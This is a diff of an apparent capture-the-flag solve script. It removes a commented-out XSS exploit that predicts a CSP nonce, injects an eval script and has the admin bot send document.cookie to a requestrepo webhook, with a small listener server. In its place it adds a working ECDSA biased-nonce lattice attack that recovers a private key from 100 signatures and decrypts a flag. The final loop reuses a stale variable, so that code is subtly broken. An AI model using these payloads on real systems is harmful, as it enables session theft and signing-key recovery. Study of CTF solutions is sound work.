@@ -1,55 +1,96 @@
-# import requests
-# import re
+from sage.all import *
+from typing import Tuple
+from  hashlib import sha256
+from Crypto.Cipher import AES
+from Crypto.Util.number import *
+from Crypto.Util.Padding import pad
+from Crypto.Random import get_random_bytes
+import re
+from pwn import *
+from tqdm import *
+p = 0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+K = GF(p)
+a = K(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc)
+b = K(0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00)
+E = EllipticCurve(K, (a, b))
+G = E(0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66, 0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650)
+E.set_order(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409 * 0x1)
+n = G.order()
+q = n
+arr = []
+B = 2 ** (q.nbits()-8)
+def digest(msg) -> int:
+    if isinstance(msg, str):
+        msg = msg.encode()
+    return int.from_bytes(sha256(msg).digest(), byteorder='big')
+io = process(["python3", "main.py"])
+io.recvuntil(b">> ")
+io.sendline(b'!2')
+for i in tqdm(range(100)):
+    io.recvuntil(b">> ")
+    msg = str(i)
+    io.sendline(msg.encode())
+    io.recvuntil(b"Signature (r,s): ")
+    res = io.recvline().decode().strip().replace("(","").replace(")","").split(", ")
+    r = int(res[0])
+    s = int(res[1])
+    arr.append({
+        'msg': msg,
+        'r': str(r),
+        's': str(s)
+    })
+io.sendline(b"!exit")
+io.recvuntil(b">> ")
+io.sendline(b'!4')
+io.recvuntil(b"Encrypted Flag: ")
+res = bytes.fromhex(io.recvline().decode().strip())
+iv = res[:16]
+ct = res[16:]
+print(iv,ct)
 
-# BASE_URL = "http://45.129.40.107:9666"
-# BASE_URL_REPORT = "http://45.129.40.107:9667"
-# PAYLOAD = """<script nonce=<NONCE>>eval(location.hash.substr(1))</script>"""
 
-# session = requests.Session()
+Mtilde = [B, 0]
+Rtilde = [0, B / q]
 
-# def login():
-#     session.post(f"{BASE_URL}/login",data={"username":"chanze","password":"chanze"})
-#     print("[+] Gen session")
+for sig in arr:
+    m, r, s = sig['msg'].encode(), int(sig['r']), int(sig['s'])
 
-# def post_note(nonce=""):
-#     r = session.post(f"{BASE_URL}/post_note",data={"note":PAYLOAD.replace("<NONCE>",nonce)}, allow_redirects=False)
-#     #print(r.headers)
-#     path_note = r.headers['Location']
-#     print(f"[+] Create note: {path_note}")
-#     return path_note
+    m = digest(m)
+    print(m)
+    Mtilde += [m * inverse(s, q) % q]
+    Rtilde += [r * inverse(s, q) % q]
 
-# def get_nonce(path_note):
-#     r = session.get(f"{BASE_URL}{path_note}")
-#     nonce = re.findall(r'nonce\-(\w+)',r.headers['Content-Security-Policy'])[0]
-#     print(f"[+] Get Nonce: {nonce}")
-#     return nonce
+Mtilde = matrix(QQ, 1, len(Mtilde), Mtilde)
+Rtilde = matrix(QQ, 1, len(Rtilde), Rtilde)
 
-# def send_report(path_to_report):
-#     url = f"http://192.168.16.3:8080/{path_to_report}#location=\"<WEBHOOK>?flag=\".concat(document.cookie)".replace("<WEBHOOK>","http://ffds4x92.requestrepo.com")
-#     session.post(BASE_URL_REPORT,data={"url":url})
+Pdiag = -q * identity_matrix(QQ, len(arr));
 
-# if __name__ == "__main__":
-#     login()
-#     path_note = post_note()
-#     nonce_array = [get_nonce(path_note) for _ in range(10)]
-#     predict_next_nonce = "<PLACE_HOLDER>"
-#     path_to_report = post_note(predict_next_nonce)
-#     send_report(path_to_report)
+Z = matrix(QQ, len(arr), 2, [0 for i in range(len(arr)*2)] )
 
-from http.server import BaseHTTPRequestHandler, HTTPServer
+# We construct the final matrix assembling all blocks
+M = block_matrix([[Z, Pdiag]])
+M = block_matrix([[Mtilde], [Rtilde], [M]])
 
-class RequestHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        print(f"Received GET request with path: {self.path}")
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"Received")
+L = M.LLL()
 
-def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
-    server_address = ('', port)
-    httpd = server_class(server_address, handler_class)
-    print(f'Starting httpd server on port {port}')
-    httpd.serve_forever()
+found = 0
+for row in L.rows():
+    if found:
+        break
+    for i in range(len(arr)):
+        if found:
+            break
+        
+        m, r, s = sig['msg'].encode(), int(sig['r']), int(sig['s'])
 
-if __name__ == "__main__":
-    run()
+        m = digest(m)
+        solk = row[i + 2]
+        if solk == 0: 
+            continue
+        for k in [solk, -solk]:
+            d = inverse(r, q) * (int(k) * s - m) % q
+            AES_KEY = sha256(long_to_bytes(int(d))).digest()
+            cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+            flag = cipher.decrypt(ct)
+            if b'L3AK{' in flag:
+                print(flag)
